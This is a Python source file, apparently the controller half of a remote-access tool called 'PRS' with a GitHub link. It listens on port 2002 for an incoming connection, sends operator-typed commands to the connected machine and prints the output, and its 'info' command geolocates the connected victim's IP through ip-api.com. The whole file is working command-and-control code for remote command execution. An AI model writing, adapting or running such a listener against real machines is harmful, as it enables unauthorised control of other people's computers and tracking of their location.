import socket
import requests
import subprocess
from rich import print
def banner():
    logo = r'''
                                    ____________________  _________
                                    \______   \______   \/   _____/
                                    |     ___/|       _/\_____  \ 
                                    |    |    |    |   \/        \
                                    |____|    |____|_  /_______  /
                                                    \/        \/ 
                                                    
                                        https://github.com/7xfb'''



    print(logo)

def clear():
    subprocess.run('cls', shell=True)

commands = ['note', 'info', 'slow']

banner()
with socket.socket() as s:
    try:
        port = 2002
        s.bind(('0.0.0.0', port))
        s.listen()

        print('[+] WAITING FOR CONNECTION...')
        conn, addr = s.accept()
        print(f'[+] CONNECTED TO: {addr[0]}')
    except KeyboardInterrupt:
        print("[DISCONNECTED]")
    while True:
        try: 
            clear()
            banner()
            print(f'[+] CONNECTED TO: {addr[0]}')
            print(f'SPECIAL COMMANDS: {', '.join(commands)}')
            command = input("Command to send >> ")

            if command == 'info':
                url = f'http://ip-api.com/json/{addr[0]}'
                response = requests.get(url)
                data = response.json()

                infos = f"""
IP: {data['query']}
[bold red]COUNTRY:[/bold red] {data.get('country')}
[bold red]REGION:[/bold red] {data.get('regionName')}
[bold red]ZIP:[/bold red] {data.get('zip')}
[bold red]ISP:[/bold red] {data.get('isp')}
[bold red]AS:[/bold red] {data.get('as')}
[bold red]CITY:[/bold red] {data.get('city')}"""

                if data.get('status') == 'fail':
                    print(f"\n[-] Unable to geolocate {addr[0]}")
                    input("\nPress Enter to continue...")
                    continue

                else:
                    print(infos)
                    input("\nPress Enter to continue...")
                    continue
                
                
                
            elif not command:
                continue
            else:
                conn.send(command.encode())
        
            if command.lower() == "exit":
                break

            result = conn.recv(4096).decode()
            if not result:
                print("[NO OUTPUT]")
            print(result)

            input("\nPress Enter to continue...")
            
        except KeyboardInterrupt:
            print("\n[DISCONNECTED]")
            break

        except socket.error as e:
            print(f"[ERROR]: {e}")
            continue
        

    